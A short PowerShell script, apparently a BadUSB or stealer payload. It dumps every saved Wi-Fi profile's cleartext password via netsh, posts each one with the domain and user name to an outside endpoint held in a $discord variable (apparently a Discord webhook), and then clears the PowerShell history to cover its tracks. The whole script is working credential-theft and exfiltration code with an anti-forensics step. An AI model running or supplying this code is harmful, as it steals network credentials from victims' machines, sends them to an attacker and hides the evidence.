
# WLAN
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $message = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

	$Body = @{
		'user' = $env:DomainName + "\" + $env:username + " | " + [string]$wlan
		'message' = [string]$message
	}
	
	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
}

# Clear the PowerShell command history
Clear-History
